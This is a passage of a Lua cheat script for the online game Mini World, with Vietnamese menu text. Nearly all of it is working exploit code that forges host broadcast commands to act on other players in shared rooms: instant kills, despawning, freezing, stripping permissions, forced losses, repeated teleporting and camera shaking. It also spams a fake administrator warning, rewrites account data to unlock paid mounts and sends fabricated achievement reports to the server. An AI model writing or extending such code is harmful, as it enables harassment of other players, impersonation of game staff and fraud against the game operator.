        NickModifyFrameModifyBtn_OnClick = oldModify
        NickModifyFrameModifyBtn_OnClickCallbackAbroad = oldModifyAbroad
        CancelNickBtn_OnClick = oldCancel
        -- 删除了恢复maxChar的代码，不再重置字数限制
    end

    -- 重写确认按钮点击事件
    function NickModifyFrameModifyBtn_OnClick()
        if not editBox then return end
        local inputText = editBox:GetText()
        if inputText == "" then
            ShowGameTipsWithoutFilter("Nội dung nhập không được để trống")
            return
        end
        getglobal("NickModifyFrame"):Hide()
        editBox:Clear()
        restoreOriginalFunc()
        if callback then callback(inputText) end
    end

    -- 海外分支共用确认逻辑
    function NickModifyFrameModifyBtn_OnClickCallbackAbroad()
        NickModifyFrameModifyBtn_OnClick()
    end

    -- 重写取消按钮
    function CancelNickBtn_OnClick()
        getglobal("NickModifyFrame"):Hide()
        restoreOriginalFunc()
    end
end


-- 指定buff
function zdbf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID buff hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "buff",
                [2] = "addBuff",
                [3] = { uin, value, 1, 0 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Buff người chơi")
    end)
end

function gypf()
    ShowPlayerList(function(targetUin)
        ShowTextInputSafe(function(text)
            local value = tonumber(text)
            if not value then
                ShowGameTipsWithoutFilter("Hãy nhập số skin hợp lệ")
                return
            end
            local skinId = "skin_" .. value
            local tdata = {
                [1] = "actor",
                [2] = "changeCustomModel",
                [3] = { targetUin, skinId }
            }
            pcall(function()
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter("#c00ffffĐã đặt cho người chơi " .. targetUin .. " Đặt skin: " .. skinId)
            end)
        end, "Nhập số skin (ví dụ 1 tương ứng skin_1)")
    end, "Chọn người chơi cần đặt skin")
end

-- 指定飞行
function zdfx()
    ShowPlayerList(function(uin)
        local tdata = {
            [1] = "player",
            [2] = "changPlayerMoveType",
            [3] = { uin, 1 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Bay")
end

function zdgz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        CurMainPlayer:setUin(uin)--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(1)--设置观战
                CurMainPlayer:setUin(AccountManager:getUin())--改观战的目标迷你号
                CurMainPlayer:setSpectatorMode(0)--设置观战
    end, "Chỉ định theo dõi")
end

function zxsw()
-- 获取玩家准心指向的实体objid
local pickedActor = CurMainPlayer:GetPickActor()

if pickedActor then
    local objid = pickedActor:getObjId()
    local objType = pickedActor:getObjType()
    
    print("========== 准心指向 ==========")
    print("对象objid:", objid)
    print("对象类型:", objType)
    
    -- 不管是不是生物，都播放特效
    local commonNameList = {
    "ice_qicaihua_01", "140113_1", "pumpkin_fireworks2", "horse_3437",
    "horse_4506_3", "horse_4662_3","horse_4502","horse_4564_3","horse_4645_3","horse_4616_3","horse_4554_3","horse_3457","horse_4503"
}
    for i = 1, #commonNameList do
    local tdata = {
        [1] = "actor",
        [2] = "playBodyEffectByFile",
        [3] = {objid,commonNameList[i], true}
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    
    
    end
    ShowGameTipsWithoutFilter("#c00ff00Tâm ngắm chỉ vào đối tượng objid: " .. objid .. " đã phát hiệu ứng")
    print("==============================")
else
    print("没有准心指向的对象")
    ShowGameTipsWithoutFilter("#cFF0000Không có đối tượng nào tại tâm ngắm")
end
end
function zdjr()
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
-- 举人+禁止移动功能（左边停止，右边开启并选择目标）
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái dừng nhấc người\nBên phải bật và chọn mục tiêu",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止
            -- ===== 停止举人 =====
            _G.xr_enabled = false
            ShowGameTipsWithoutFilter("Đã dừng nhấc người")
            
            -- 可选：恢复所有玩家移动
            threadpool:work(function()
                threadpool:wait(0.5)
                if not _G.xr_enabled then
                    local num = ClientCurGame:getNumPlayerBriefInfo()
                    for i = 1, num do
                        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
                        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
                            local tdata = {}
                            tdata[1] = "player"
                            tdata[2] = "setActionAttrState"
                            tdata[3] = {briefInfo.uin, 1, true}  -- true = 恢复移动
                            pcall(function() 
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata) 
                            end)
                        end
                    end
                    ShowGameTipsWithoutFilter("#c00ffffĐã khôi phục di chuyển cho tất cả người chơi")
                end
            end)
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：开启
            -- ===== 开启举人 =====
            _G.xr_enabled = true
            
            -- 检查是否在游戏中
            if not ClientCurGame or not ClientCurGame:isInGame() then
                ShowGameTipsWithoutFilter("Hãy vào phòng game trước")
                _G.xr_enabled = false
                return
            end
            
            -- 预加载玩家列表
            LoadHomelandLuas()
            
            -- 获取玩家列表
            local uin_list = GetPlayerUinList()
            
            if #uin_list == 0 then
                ShowGameTipsWithoutFilter("Phòng hiện tại không có người chơi khác")
                _G.xr_enabled = false
                return
            end
            
            -- 构建玩家列表数据
            local data = {
                visit = {
                    history_num = "Chọn mục tiêu cần nhấc",
                    today_num = "#cFF7aad" .. #uin_list
                },
                event_home = {{param1 = 0, event_id = 5, event_time = 0}},
                event_visit = {}
            }
            
            for i = 1, #uin_list do
                data.event_visit[i] = {uin = uin_list[i], event_id = 5, event_time = 0}
            end
            
            -- 打开玩家列表
            GetInst("UIManager"):Open("HomeEventRecord")
            GetInst("UIManager"):GetCtrl("HomeEventRecord"):UpdateUI(data)
            getglobal("HomeEventRecordTitleFrameName"):SetText("Hãy chọn người chơi cần nhấc")
            getglobal("HomeEventRecordTodayVisterText"):SetText("#cFF7aadDanh sách người chơi")
            getglobal("HomeEventRecordTotalVisterText"):SetText("#cFF7aadNhấn để bắt đầu nhấc người")
            
            -- 设置点击事件
            local ctrl = GetInst("UIManager"):GetCtrl("HomeEventRecord")
            
            -- 保存原来的函数
            local originalFunc = ctrl.EnterFriendHomeBtn_OnClick
            
            function ctrl:EnterFriendHomeBtn_OnClick()
                -- 关闭玩家列表
                GetInst("UIManager"):Close("HomeEventRecord")
                
                -- 恢复原来的函数
                ctrl.EnterFriendHomeBtn_OnClick = originalFunc
                
                -- 获取选中的玩家UIN
                local targetUin = this:GetClientID()
                
                ---=== 白名单检查开始 ===---
                    if whitelist[targetUin] then
                        ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                        _G.xr_enabled = false  -- 停止本次
                        return
                    end
                    ---=== 白名单检查结束 ===---
                
                ShowGameTipsWithoutFilter("#c00ffffĐã chọn người chơi:" .. targetUin .. ", bắt đầu liên tục nhấc người lên đầu mình")
                
                -- 启动举人循环
                threadpool:work(function()
                    local loopCount = 0
                    
                    while _G.xr_enabled do
                        loopCount = loopCount + 1
                        
                        -- ===== 举人功能：传送到头上 =====
                        local myX, myY, myZ = CurMainPlayer:getPosition(0, 0, 0)
                        local target_x, target_y, target_z = myX / 100, myY / 100 + 4, myZ / 100
                        
                        local tdata1 = {
                            [1] = "player",
                            [2] = "setPosition",
                            [3] = { targetUin, target_x, target_y, target_z }
                        }
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1) 
                        end)
                        -- =================================
                        
                        -- ===== 禁止移动功能 =====
                        local tdata2 = {}
                        tdata2[1] = "player"
                        tdata2[2] = "setActionAttrState"
                        tdata2[3] = {targetUin, 1, false}  -- false = 禁止移动
                        pcall(function() 
                            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2) 
                        end)
                        -- =======================
                        
                        -- 每10次显示一次提示
                       
                        
                        threadpool:wait(0.01)  -- 0.01秒执行一次（非常快）
                    end
                    
                    ShowGameTipsWithoutFilter("#cFF0000Vòng lặp nhấc người đã kết thúc")
                end)
            end
            -- ====================
        end
    end
)
end

-- 人物改血
function rwgx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ")
            return
        end
        local tdata1 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 1 }
        }
        local tdata2 = {
            [1] = "player",
            [2] = "setAtt",
            [3] = { AccountManager:getUin(), value, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
    end)
end

-- 召唤坐骑
function zhzq()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID thú cưỡi hợp lệ")
            return
        end
        CurMainPlayer:summonAccountHorse(value)
    end)
end

-- 玩家大小
function wjdx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (kích thước)")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 21 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Kích thước người chơi")
    end)
end

-- 玩家生命
function wjsm()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập giá trị sinh lực hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata1 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 1 }
            }
            local tdata2 = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 2 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata1)
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata2)
        end, "Sinh lực người chơi")
    end)
end

-- 玩家攻击力
function wjgjl()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập giá trị sức tấn công hợp lệ")
            return
        end
        ShowPlayerList(function(uin)
            if whitelist[uin] then
                ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
                return
            end
            local tdata = {
                [1] = "player",
                [2] = "setAtt",
                [3] = { uin, value, 17 }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end, "Sức tấn công người chơi")
    end)
end

-- 自定大小
function zddx()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số hợp lệ (tỷ lệ thu phóng)")
            return
        end
        local player = CurMainPlayer
        player:setCustomScale(value)
        player:syncCustomScale()
        ShowGameTips("Đã đặt kích thước tùy chỉnh:" .. value, 3)
    end)
end

-- id取物
function bbqw()
    GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")

-- 左边：ID取物 | 右边：编辑器取物
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái lấy vật phẩm bằng ID\nBên phải lấy từ kho vật phẩm",  -- 消息内容
    "Xác nhận",                   -- 标题
    nil,                          -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：ID取物
            -- ===== ID取物 =====
            ShowTextInputSafe(function(text)
                if #text == 0 then 
                    ShowGameTipsWithoutFilter("Nội dung nhập không được để trống")
                    return 
                end
                
                local uin = AccountManager:getUin()
                local itemId, itemCount
                
                -- 尝试解析逗号分隔的格式，例如 "123,64"
                local commaPos = string.find(text, ",")
                if commaPos then
                    local parts = {}
                    for part in string.gmatch(text, "[^,]+") do
                        table.insert(parts, part)
                    end
                    itemId = tonumber(parts[1]) or 0
                    itemCount = tonumber(parts[2]) or 64
                else
                    -- 纯数字，当作物品ID，数量默认为64
                    itemId = tonumber(text) or 0
                    itemCount = 64
                end
                
                if itemId == 0 then
                    ShowGameTipsWithoutFilter("ID vật phẩm không hợp lệ")
                    return
                end
                
                -- 发送添加物品广播
                local tdata = {
                    [1] = "backpack",
                    [2] = "addItem",
                    [3] = { uin, itemId, itemCount }
                }
                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                ShowGameTipsWithoutFilter(string.format("Thêm vật phẩm: %d Số lượng: %d", itemId, itemCount))
            end, "Nhập ID vật phẩm,số lượng (ví dụ 123,64)")
            -- ====================
            
        elseif btnType == 1 then  -- 右边按钮：编辑器取物
            -- ===== 编辑器取物 =====
            threadpool:work(function()
                local isInGame = ClientCurGame:isInGame()
                if isInGame then
                    local param = {
                        useLibrary = 2,
                        sstype = {modpacketid = "", modlib = false}
                    }
                    param.callback = function(ID)
                        if ID and ID ~= 0 then
                            local itemDef = ItemDefCsv:get(ID)
                            if itemDef then
                                local tdata = {}
                                tdata[1] = "backpack"
                                tdata[2] = "addItem"
                                tdata[3] = {AccountManager:getUin(), ID, itemDef.StackMax}
                                ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
                                ShowGameTipsWithoutFilter("#cFF7aad" .. itemDef.Name .. "Đã thêm thành công")
                            end
                        end
                    end
                    GetInst("MiniUIManager"):OpenUI("ResourceSelectorFrame", "miniui/miniworld/ugc_resourceselector", "ResourceSelectorFrameAutoGen", param)
                else
                    ShowGameTipsWithoutFilter("Chưa vào bản đồ, không thể sử dụng")
                end
            end)
            -- ====================
        end
    end
)
end

-- 武器皮肤
function wqpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số ID skin hợp lệ")
            return
        end
        local uin = AccountManager:getUin()
        SandboxMgr:sendToHost(
            "UPDATE_WEAPON_SKIN_INFO_HOST",
            '{"uin":"' .. uin .. '","skinList":{"' .. uin .. '":[' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ',' .. value .. ']}}'
        )
    end)
end

-- 召唤宠物
function zhcw()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID thú cưng hợp lệ")
            return
        end
        CurMainPlayer:summonPet(1000, AccountManager:getUin() .. "_0", value, 5, 3, '#b#RCúp Fiji')
    end)
end

function qhdw()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập ID đội hợp lệ (dạng số)")
            return
        end
        local tdata = {
            [1] = "team",
            [2] = "changePlayerTeam",
            [3] = { AccountManager:getUin(), value }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end)
end
      
function zdpf()
    ShowTextInputSafe(function(text)
        local value = tonumber(text)
        if not value then
            ShowGameTipsWithoutFilter("Hãy nhập số skin hợp lệ")
            return
        end
        local skinId = "skin_" .. value
        local tdata = {
            [1] = "actor",
            [2] = "changeCustomModel",
            [3] = { AccountManager:getUin(), skinId }
        }
        pcall(function()
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end)
    end, "Nhập số skin (ví dụ 1 tương ứng skin_1)")
end
        
        
function jqms()
    -- 观战目标设置功能（左边停止并恢复，右边开启并设置观战目标）
GetInst("MiniUIManager"):CloseUI("main_songbookAutoGen")
GetInst("MessageBoxInterface"):dualBtnBox(
    "Bên trái tắt\nBên phải bật\nPhải tắt trước khi rời phòng",  -- 消息内容
    "Đóng",        -- 标题
    nil,                  -- 图标
    function(userData, btnType)
        if btnType == 0 then  -- 左边按钮：停止并恢复
            -- ===== 停止观战循环 =====
            _G.spectate_loop_enabled = false
            ShowGameTipsWithoutFilter("#cFF0000Vòng lặp đã dừng")
            
            -- 恢复自己的迷你号
            if CurMainPlayer then
                local myUin = AccountManager:getUin()
                CurMainPlayer:setUin(myUin)
                ShowGameTipsWithoutFilter("Đã tắt")
            end
            -- =========================
            
        elseif btnType == 1 then  -- 右边按钮：开启并设置
            -- ===== 开启观战循环 =====
            _G.spectate_loop_enabled = true
            ShowGameTipsWithoutFilter("#c00ffffĐã bật")
            
            -- 启动观战循环
            threadpool:work(function()
                while _G.spectate_loop_enabled do
                    -- 显示战斗准备界面
                    getglobal("BattlePrepareFrame"):Show()
                    getglobal("BattlePrepareFrameStartGame"):Show()
                    getglobal("BattlePrepareFrameTips"):SetText("Chế độ trước trận")
                    
                    -- 设置观战目标为迷你号1000
                    CurMainPlayer:setUin(ClientCurGame:getHostUin())
                    
                    -- 等待0.1秒
                    threadpool:wait(0.1)
                end
            end)
            -- =========================
        end
    end
)
end


-- ==================== 简单功能函数 ====================



function jzgj()
    local tdata = {
        [1] = "gamerule",
        [2] = "setAttackPlayerMode",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function dtzl()
    local tdata = {
        [1] = "gamerule",
        [2] = "setGravityFactor",
        [3] = { 0.1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq1()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 1 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq2()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 3 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq3()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 5 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function gbtq4()
    local tdata = {
        [1] = "gamerule",
        [2] = "setWeather",
        [3] = { 6 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wfgj()
    local tdata = {
        [1] = "player",
        [2] = "setActionAttrState",
        [3] = { AccountManager:getUin(), 64, false }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function qtxr()
    local num = ClientCurGame:getNumPlayerBriefInfo()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    
    for i = 1, num do
        local briefInfo = ClientCurGame:getPlayerBriefInfo(i - 1)
        if briefInfo and briefInfo.uin and briefInfo.uin > 1000 then
            local tdata = {
                [1] = "player",
                [2] = "setPosition",
                [3] = { briefInfo.uin, new_x, new_y, new_z }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end
end

function szfs()
    local tdata = {
        [1] = "player",
        [2] = "setAtt",
        [3] = { AccountManager:getUin(), 99999999, 22 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function czgw()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local new_x, new_y, new_z = x / 100, y / 100, z / 100
    local tdata = {
        [1] = "world",
        [2] = "spawnMob",
        [3] = { new_x, new_y, new_z, 3517, 1, true }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function phfk()
    local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
    local gridX, gridY, gridZ = x / 100, y / 100, z / 100
    
    local startPos = { x = gridX - 25, y = gridY - 50, z = gridZ - 25 }
    local endPos = { x = gridX + 24, y = gridY + 49, z = gridZ + 24 }
    
    local tdata = {
        [1] = "area",
        [2] = "clearAllBlockAreaRange",
        [3] = { startPos, endPos, 0 }
    }
    ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end

function wjsb()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "setGameResults",
            [3] = { uin, 2 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Người chơi thất bại")
end

function wjtx()
    ShowPlayerList(function(uin)
        for i = 1, #effectNameList do
            local tdata = {
                [1] = "actor",
                [2] = "playBodyEffectByFile",
                [3] = { uin, effectNameList[i], true }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Hiệu ứng người chơi")
end

function jbwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "playerHurt",
            [3] = { AccountManager:getUin(), uin, 1.8e+308, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Người chơi tử vong")
end

function kjzq()
-- 解锁坐骑（使用提供的坐骑ID列表）
-- 获取玩家账户数据
local accountData = AccountManager:getAccountData().Account

-- 获取BillDataSvr
local BillDataSvr = accountData.BillDataSvr

-- 坐骑ID列表
local horseIds = {
    3437,3496,4532,4587,4566,4624,4502,3459,4520,4561,3440,4595,3245
}

-- 设置解锁坐骑数量
BillDataSvr.UnlockRiderInfoNum = #horseIds

-- 创建新的解锁坐骑信息表
local newRiderInfo = {}

-- 遍历坐骑ID列表，为每个ID创建坐骑信息
for i, horseId in ipairs(horseIds) do
    newRiderInfo[i] = {
        RiderID = horseId,    -- 使用列表中的坐骑ID
        RiderLevel = 1,       -- 坐骑等级设为1
        -- 如果有其他必要字段，可以在这里添加
    }
end

-- 替换原有的坐骑信息
BillDataSvr.UnlockRiderInfo = newRiderInfo

-- 也可以修改leveldb中的数据（如果需要）
if accountData.leveldb then
    local leveldbRiderInfo = {}
    for _, horseId in ipairs(horseIds) do
        table.insert(leveldbRiderInfo, {
            RiderID = horseId,
            RiderLevel = 1,
        })
    end
    accountData.leveldb.UnlockRiderInfo = leveldbRiderInfo
end


end


function bfyx()

-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local new_x = x / 100
local new_y = y / 100
local new_z = z / 100

CurWorld:playSoundAndParticleEffect(new_x, new_y, new_z, 'pvp.kill_6', 100, 50, 0, new_x, new_y, new_z, 0, 1, 100)
end

function sqxz()
Rxz = {1001, 1002, 1003, 1004, 1005, 1006, 1008, 1010, 1011, 1012, 1014, 1015, 1017, 1018, 1019, 1020}

    for dm = 1, 22 do
        local index = dm + 1  
        if Rxz[index] then
            ArchievementGetInstance().func:Report2Server(Rxz[index], {pos = 838384, add = 2001, count = 2001})
        end
    end   
    end
    
    
    function tjsw()
for a=0,100000 do 
    threadpool:wait(1)
-- 获取玩家当前位置
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local center_x = x / 100
local center_y = y / 100
local center_z = z / 100

-- 椭圆参数（距离8-10格，空心更大）
local a = 6.0  -- X轴半径（左右方向）8格
local b = 4.0  -- Z轴半径（前后方向）6格
local points = 7  -- 特效数量，距离远了需要更多特效

-- 只在椭圆边缘播放特效（空心）
for i = 0, points - 1 do
    local angle = (i / points) * math.pi * 2
    
    -- 计算椭圆边缘上的坐标
    local offset_x = math.cos(angle) * a
    local offset_z = math.sin(angle) * b
    
    -- 计算最终位置（只在椭圆边缘）
    local new_x = center_x + offset_x
    local new_y = center_y
    local new_z = center_z + offset_z
    
    -- 播放闪电特效
    CurWorld:playSoundAndParticleEffect(
        new_x, new_y, new_z, 0, 0, 0, 0, 
        new_x, new_y, new_z, 
        'particles/aotu_06_leishenzhichui.ent', 1, 20
    )
end

print("已在你周围8x6格处生成空心椭圆形闪电圈")
end
end

function qcbf()
for a=0,100000 do 
    threadpool:wait(0.1)
tdata = {}
    tdata[1] = "buff";
    tdata[2] = "clearAllBuff";
    tdata[3] = {AccountManager:getUin()}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
end
end


function bcfhd()
local x, y, z = CurMainPlayer:getPosition(0, 0, 0)
local base_x = x / 100
local base_y = y / 100
local base_z = z / 100
for dx = -1, 1 do

ShowPlayerList(function(uin)
if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        tdata = {}
    tdata[1] = "player";
    tdata[2] = "setRevivePoint";
    tdata[3] = {uin,base_x,base_y,base_z}
ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Chỉ định điểm hồi sinh của người chơi")
    end
    end

function fhxk()
    ShowGameTipsWithoutFilter("Chức năng hồi sinh hư không")
end

function jzyd()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "actor",
            [2] = "setActionAttrState",
            [3] = { uin, PLAYERATTR.ENABLE_MOVE, false }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Cấm di chuyển")
end

function gbqx()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local flags = { 2, 4, 8, 16, 256, 2048 }
        for _, flag in ipairs(flags) do
            local tdata = {
                [1] = "player",
                [2] = "setActionAttrState",
                [3] = { uin, flag, false }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Tắt quyền")
end

function wjxz()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "rotateCamera",
            [3] = { uin, -999994890, -9999999 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xoay người chơi")
end

function tjbf()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "buff",
            [2] = "addBuff",
            [3] = { uin, 46, 1, 0 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Giam giữ người chơi")
end

function qcwj()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "world",
            [2] = "despawnActor",
            [3] = { uin }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Xóa người chơi")
end

function jgwj()
    ShowPlayerList(function(uin)
        for a = 0, 10000 do
            threadpool:wait(0.1)
            local tdata = {
                [1] = "player",
                [2] = "notifyGameInfo2Self",
                [3] = { uin, "#RTôi là quản trị viên Mini, phát hiện bạn vi phạm; cảnh cáo lần một, lần hai sẽ xử lý trực tiếp" }
            }
            ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
        end
    end, "Cảnh cáo người chơi")
end



function ddjt()
    ShowPlayerList(function(uin)
    if whitelist[uin] then
        -- 弹出提示（请根据实际环境选择合适的函数）
        if ShowGameTipsWithoutFilter then
            ShowGameTipsWithoutFilter("Cấm sử dụng chức năng này với VIP", 3)
        else
            ShowGameTips("Cấm sử dụng chức năng này với VIP", 3)
        end
        return
    end
        local tdata = {
            [1] = "player",
            [2] = "shakeCamera",
            [3] = { uin, 10000, 1000 }
        }
        ScriptSupportTask:reportTaskToHost(SSTASKID.HOST_BordCast, tdata)
    end, "Rung camera")
end

function fjhmd()
    ShowPlayerList(function(uin)
        for a = 0, 100000 do
            threadpool:wait(0.1)
            if whitelist[uin] then
